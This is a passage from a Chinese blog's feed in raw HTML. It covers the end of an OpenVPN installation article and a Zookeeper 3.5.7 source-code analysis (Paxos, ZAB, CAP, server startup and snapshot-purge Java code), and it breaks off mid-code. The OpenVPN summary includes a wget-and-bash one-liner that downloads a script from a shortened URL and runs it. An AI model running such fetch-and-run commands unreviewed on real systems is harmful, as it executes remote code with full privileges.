class="comment">#指定日志文件的记录详细级别，可选0-9，等级越高日志内容越详细</span></span><br><span class="line">persist-key     <span class="comment">#通过keepalive检测超时后，重新启动VPN，不重新读取keys，保留第一次使用的keys</span></span><br><span class="line">persist-tun     <span class="comment">#检测超时后，重新启动VPN，一直保持tun是linkup的。否则网络会先linkdown然后再linkup</span></span><br></pre></td></tr></table></figure><hr><p><a href="https://enjoyms.com/2020/10/28/%E9%85%8D%E7%BD%AEdocker-openvpn%E8%BD%AC%E5%8F%91%E6%8C%87%E5%AE%9A%E7%BD%91%E6%AE%B5%E6%B5%81%E9%87%8F/" target="_blank" rel="noopener" title="https://enjoyms.com/2020/10/28/配置docker-openvpn转发指定网段流量/">https://enjoyms.com/2020/10/28/配置docker-openvpn转发指定网段流量/</a></p><p><a href="https://www.vsay.net/mycode/142.html" target="_blank" rel="noopener" title="https://www.vsay.net/mycode/142.html">https://www.vsay.net/mycode/142.html</a></p><p><a href="http://inat.top/archives/503/" target="_blank" rel="noopener" title="http://inat.top/archives/503/">http://inat.top/archives/503/</a></p><p><a href="https://www.chillifish.cn/3248.html" target="_blank" rel="noopener" title="https://www.chillifish.cn/3248.html">https://www.chillifish.cn/3248.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;OpenVPN 安装与使用&lt;/h1&gt;
&lt;h1&gt;一、一键安装与使用&lt;/h1&gt;
&lt;h2 id=&quot;1、服务端安装使用&quot;&gt;1、服务端安装使用&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 进入Linux服务器以后，请使用下面的一键安装命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 脚本来源于开源Github:https://github.com/Nyr/openvpn-install&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 可能会下载失败，需要手动或者科学&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;wget https://git.io/vpn -O openvpn-install.sh &amp;amp;&amp;amp; bash openvpn-install.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 安装失败的话，先下载在执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bash openvpn-install.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;##&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 另一个脚本，但是大差不差，可以结合使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# https://github.com/hwdsl2/openvpn-install/blob/master/README-zh.md&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后按照流程选择，注意公网的ip和端口要保证通&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://blog.shawncoding.top/categories/Linux/"/>
    
    
    <category term="网络" scheme="https://blog.shawncoding.top/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>Zookeeper3.5.7源码分析</title>
    <link href="https://blog.shawncoding.top/posts/f1ca6261.html"/>
    <id>https://blog.shawncoding.top/posts/f1ca6261.html</id>
    <published>2024-02-06T07:04:48.000Z</published>
    <updated>2024-02-29T12:07:57.393Z</updated>
    
    <content type="html"><![CDATA[<h1>Zookeeper3.5.7源码分析</h1><h1>一、Zookeeper算法一致性</h1><h2 id="1、Paxos-算法">1、Paxos 算法</h2><h3 id="1-1-概述">1.1 概述</h3><p>Paxos算法：一种基于消息传递且具有高度容错特性的一致性算法。Paxos算法解决的问题：就是如何快速正确的在一个分布式系统中对某个数据值达成一致，并且保证不论发生任何异常，都不会破坏整个系统的一致性。</p><p>在一个Paxos系统中，首先将所有节点划分为Proposer（提议者），Acceptor（接受者），和Learner（学习者）。（注意：每个节点都可以身兼数职），一个完整的Paxos算法流程分为三个阶段：</p><p><strong>Prepare准备阶段</strong></p><ul><li>Proposer向多个Acceptor发出Propose请求Promise（承诺）</li><li>Acceptor针对收到的Propose请求进行Promise（承诺）</li></ul><p><strong>Accept接受阶段</strong></p><ul><li>Proposer收到多数Acceptor承诺的Promise后，向Acceptor发出Propose请求</li><li>Acceptor针对收到的Propose请求进行Accept处理</li></ul><p><strong>Learn学习阶段</strong>：Proposer将形成的决议发送给所有Learners</p><a id="more"></a><h3 id="1-2-算法流程">1.2 算法流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817145.png" alt></p><h3 id="1-3-算法缺陷">1.3 算法缺陷</h3><p>在网络复杂的情况下，一个应用 Paxos 算法的分布式系统，可能很久无法收敛，甚至陷入活锁的情况。造成这种情况的原因是系统中有一个以上的 Proposer，多个Proposers 相互争夺Acceptor，造成迟迟无法达成一致的情况。针对这种情况，一种改进的 Paxos 算法被提出：从系统中选出一个节点作为 Leader，只有 Leader 能够发起提案。这样，一次 Paxos 流程中只有一个Proposer，不会出现活锁的情况</p><h2 id="2、ZAB-协议">2、ZAB 协议</h2><h3 id="2-1-概述">2.1 概述</h3><p>Zab 借鉴了 Paxos 算法，是特别为 Zookeeper 设计的支持崩溃恢复的原子广播协议。基于该协议，Zookeeper 设计为只有一台客户端（Leader）负责处理外部的写事务请求，然后Leader 客户端将数据同步到其他 Follower 节点。即 Zookeeper 只有一个 Leader 可以发起提案</p><h3 id="2-2-Zab-协议内容">2.2 Zab 协议内容</h3><p>Zab 协议包括两种基本的模式：消息广播、崩溃恢复</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817146.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817147.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817148.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817150.png" alt></p><h2 id="3、CAP理论">3、CAP理论</h2><p>CAP理论告诉我们，一个分布式系统不可能同时满足以下三种</p><ul><li><p>一致性（C:Consistency）</p><p>在分布式环境中，一致性是指数据在<strong>多个副本之间是否能够保持数据一致的特性</strong>。在一致性的需求下，当一个系统在数据一致的状态下执行更新操作后，应该保证系统的数据仍然处于一致的状态。</p></li><li><p>可用性（A:Available）</p><p>可用性是指<strong>系统提供的服务必须一直处于可用的状态</strong>，对于用户的每一个操作请求总是能够在有限的时间内返回结果</p></li><li><p>分区容错性（P:Partition Tolerance）</p><p>分布式系统在遇到任何网络分区故障的时候，仍然需要能够保证对外提供满足一致性和可用性的服务，除非是整个网络环境都发生了故障</p></li></ul><p>这三个基本需求，最多只能同时满足其中的两项，因为P是必须的，因此往往选择就在CP或者AP中。<strong>ZooKeeper保证的是CP</strong></p><ul><li><strong>ZooKeeper不能保证每次服务请求的可用性</strong>。（注：在极端环境下，ZooKeeper可能会丢弃一些请求，消费者程序需要重新请求才能获得结果）。所以说，ZooKeeper不能保证服务可用性。</li><li><strong>进行Leader选举时集群都是不可用</strong></li></ul><h1>二、源码详解</h1><blockquote><p>Zookeeper源码下载地址：<a href="https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/" target="_blank" rel="noopener" title="https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/">https://archive.apache.org/dist/zookeeper/zookeeper-3.5.7/</a></p></blockquote><h2 id="1、辅助源码">1、辅助源码</h2><h3 id="1-1-持久化源码-了解">1.1 持久化源码(了解)</h3><p>Leader 和 Follower 中的数据会在内存和磁盘中各保存一份。所以需要将内存中的数据持久化到磁盘中，在 org.apache.zookeeper.server.persistence 包下的相关类都是序列化相关的代码</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817151.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">SnapShot</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 反序列化方法</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">deserialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 序列化方法</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">serialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,</span></span></span><br><span class="line"><span class="function"><span class="params">    File name)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *find the most recent snapshot file</span></span><br><span class="line"><span class="comment">    *查找最近的快照文件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function">File <span class="title">findMostRecentSnapshot</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 释放资源</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TxnLog</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置服务状态</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setServerStats</span><span class="params">(ServerStats serverStats)</span></span>;</span><br><span class="line">    <span class="comment">// 滚动日志</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rollLog</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 追 加</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">append</span><span class="params">(TxnHeader hdr, Record r)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 读取数据</span></span><br><span class="line">    <span class="function">TxnIterator <span class="title">read</span><span class="params">(<span class="keyword">long</span> zxid)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 获取最后一个 zxid</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getLastLoggedZxid</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 删除日志</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">truncate</span><span class="params">(<span class="keyword">long</span> zxid)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 获 取 DbId</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getDbId</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 提 交</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 日志同步时间</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getTxnLogSyncElapsedTime</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 关闭日志</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="comment">// 读取日志的接口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TxnIterator</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取头信息</span></span><br><span class="line">        <span class="function">TxnHeader <span class="title">getHeader</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="comment">// 获取传输的内容</span></span><br><span class="line">        <span class="function">Record <span class="title">getTxn</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="comment">// 下一条记录</span></span><br><span class="line">        <span class="function"><span class="keyword">boolean</span> <span class="title">next</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">        <span class="comment">// 获取存储的大小</span></span><br><span class="line">        <span class="function"><span class="keyword">long</span> <span class="title">getStorageSize</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-序列化源码">1.2 序列化源码</h3><p>zookeeper-jute 代码是关于Zookeeper 序列化相关源码</p><p><img src="http://qnypic.shawncoding.top/blog/202402291817152.png" alt></p><h2 id="2、ZK-服务端初始化源码解析">2、ZK 服务端初始化源码解析</h2><p><img src="http://qnypic.shawncoding.top/blog/202402291817153.png" alt></p><h3 id="2-1-启用脚本分析">2.1 启用脚本分析</h3><p><a href="http://zkServer.sh" target="_blank" rel="noopener">zkServer.sh</a> start 底层的实际执行内容，所以程序的入口是 QuorumPeerMain.java 类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nohup <span class="string">"<span class="variable">$JAVA</span>"</span> </span><br><span class="line">+ 一堆提交参数</span><br><span class="line">+ <span class="variable">$ZOOMAIN</span>(org.apache.zookeeper.server.quorum.QuorumPeerMain)</span><br><span class="line">+ <span class="string">"<span class="variable">$ZOOCFG</span>"</span>(zkEnv.sh 文件中 ZOOCFG=<span class="string">"zoo.cfg"</span>)</span><br></pre></td></tr></table></figure><h3 id="2-2-ZK-服务端启动入口">2.2 ZK 服务端启动入口</h3><p>源码里查找QuorumPeerMain类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建了一个 zk 节点</span></span><br><span class="line">    QuorumPeerMain main = <span class="keyword">new</span> QuorumPeerMain();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化节点并运行，args 相当于提交参数中的 zoo.cfg</span></span><br><span class="line">    main.initializeAndRun(args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">    ... ...</span><br><span class="line">    &#125;</span><br><span class="line">    LOG.info(<span class="string">"Exiting normally"</span>); System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initializeAndRun</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> ConfigException, IOException, AdminServerException</span>&#123;</span><br><span class="line">    <span class="comment">// 管理 zk 的配置信息</span></span><br><span class="line">    QuorumPeerConfig config = <span class="keyword">new</span> QuorumPeerConfig();</span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 1 解析参数，zoo.cfg 和 myid</span></span><br><span class="line">    config.parse(args[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2 启动定时任务，对过期的快照，执行删除（默认该功能关闭）</span></span><br><span class="line">    <span class="comment">// Start and schedule the the purge task</span></span><br><span class="line">    DatadirCleanupManager purgeMgr = <span class="keyword">new</span> DatadirCleanupManager(config</span><br><span class="line">    .getDataDir(), config.getDataLogDir(), config</span><br><span class="line">    .getSnapRetainCount(), config.getPurgeInterval()); purgeMgr.start();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (args.length == <span class="number">1</span> &amp;&amp; config.isDistributed()) &#123;</span><br><span class="line">    <span class="comment">// 3 启动集群</span></span><br><span class="line">    runFromConfig(config);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    LOG.warn(<span class="string">"Either no config or no quorum defined in config, running "</span></span><br><span class="line">    + <span class="string">" in standalone mode"</span>);</span><br><span class="line">    <span class="comment">// there is only server in the quorum -- run as standalone ZooKeeperServerMain.main(args);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-解析参数-zoo-cfg-和-myid">2.3 解析参数 zoo.cfg 和 myid</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parse</span><span class="params">(String path)</span> <span class="keyword">throws</span> ConfigException </span>&#123;</span><br><span class="line">    LOG.info(<span class="string">"Reading configuration from: "</span> + path);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 校验文件路径及是否存在</span></span><br><span class="line">    File configFile = (<span class="keyword">new</span> VerifyingFileFactory.Builder(LOG)</span><br><span class="line">    .warnForRelativePath()</span><br><span class="line">    .failForNonExistingPath()</span><br><span class="line">    .build()).create(path);</span><br><span class="line">    </span><br><span class="line">    Properties cfg = <span class="keyword">new</span> Properties();</span><br><span class="line">    FileInputStream in = <span class="keyword">new</span> FileInputStream(configFile); </span><br><span class="line">    <span class="comment">// 加载配置文件</span></span><br><span class="line">    cfg.load(in);</span><br><span class="line">    configFileStr = path;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    in.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">    parseProperties(cfg);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Error processing "</span> + path, e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConfigException(<span class="string">"Error processing "</span> + path, e);</span><br><span class="line">    &#125;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// parseProperties(cfg)方法拉到最下面setupQuorumPeerConfig</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setupQuorumPeerConfig</span><span class="params">(Properties prop, <span class="keyword">boolean</span> configBackwardCompatibilityMode)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ConfigException </span>&#123;</span><br><span class="line">    quorumVerifier = parseDynamicConfig(prop, electionAlg, <span class="keyword">true</span>, configBackwardCompatibilityMode);</span><br><span class="line">    </span><br><span class="line">    setupMyId();</span><br><span class="line">    setupClientPort();</span><br><span class="line">    setupPeerType();</span><br><span class="line">    checkValidity();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setupMyId</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    File myIdFile = <span class="keyword">new</span> File(dataDir, <span class="string">"myid"</span>);</span><br><span class="line">    <span class="comment">// standalone server doesn't need myid file.</span></span><br><span class="line">    <span class="keyword">if</span> (!myIdFile.isFile()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(myIdFile));</span><br><span class="line">    String myIdString;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        myIdString = br.readLine();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        br.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 将解析 myid 文件中的 id 赋值给 serverId</span></span><br><span class="line">        serverId = Long.parseLong(myIdString);</span><br><span class="line">        MDC.put(<span class="string">"myid"</span>, myIdString);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"serverid "</span> + myIdString</span><br><span class="line">                + <span class="string">" is not a number"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-过期快照删除">2.4 过期快照删除</h3><p>可以启动定时任务，对过期的快照，执行删除。默认该功能时关闭的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2 启动定时任务，对过期的快照，执行删除（默认是关闭）</span></span><br><span class="line"><span class="comment">// config.getSnapRetainCount() = 3 最少保留的快照个数</span></span><br><span class="line"><span class="comment">// config.getPurgeInterval() = 0  默认 0 表示关闭</span></span><br><span class="line">DatadirCleanupManager purgeMgr = <span class="keyword">new</span> DatadirCleanupManager(config</span><br><span class="line">        .getDataDir(), config.getDataLogDir(), config</span><br><span class="line">        .getSnapRetainCount(), config.getPurgeInterval());</span><br><span class="line">purgeMgr.start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (PurgeTaskStatus.STARTED == purgeTaskStatus) &#123; </span><br><span class="line">        LOG.warn(<span class="string">"Purge task is already running."</span>); <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 默认情况 purgeInterval=0，该任务关闭，直接返回</span></span><br><span class="line">    <span class="comment">// Don't schedule the purge task with zero or negative purge interval.</span></span><br><span class="line">    <span class="keyword">if</span> (purgeInterval &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        LOG.info(<span class="string">"Purge task is not scheduled."</span>); </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建一个定时器</span></span><br><span class="line">    timer = <span class="keyword">new</span> Timer(<span class="string">"PurgeTask"</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 创建一个清理快照任务</span></span><br><span class="line">    TimerTask task = <span class="keyword">new</span> PurgeTask(dataLogDir, snapDir, snapRetainCount);</span><br><span class="line">    <span class="comment">// 如果 purgeInterval 设置的值是 1，表示 1 小时检查一次，判断是否有过期快照， 有则删除</span></span><br><span class="line">    timer.scheduleAtFixedRate(task, <span class="number">0</span>, TimeUnit.HOURS.toMillis(purgeInterval));</span><br><span class="line">    </span><br><span class="line">    purgeTaskStatus = PurgeTaskStatus.STARTED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PurgeTask</span> <span class="keyword">extends</span> <span class="title">TimerTask</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> File logsDir;</span><br><span class="line">    <span class="keyword">private</span> File snapsDir; <span class="keyword">private</span> <span class="keyword">int</span> snapRetainCount;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PurgeTask</span><span class="params">(File dataDir, File snapDir, <span class="keyword">int</span> count)</span> </span>&#123; </span><br><span class="line">    logsDir = dataDir;</span><br><span class="line">    snapsDir = snapDir; snapRetainCount = count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LOG.info(<span class="string">"Purge task started."</span>); </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span 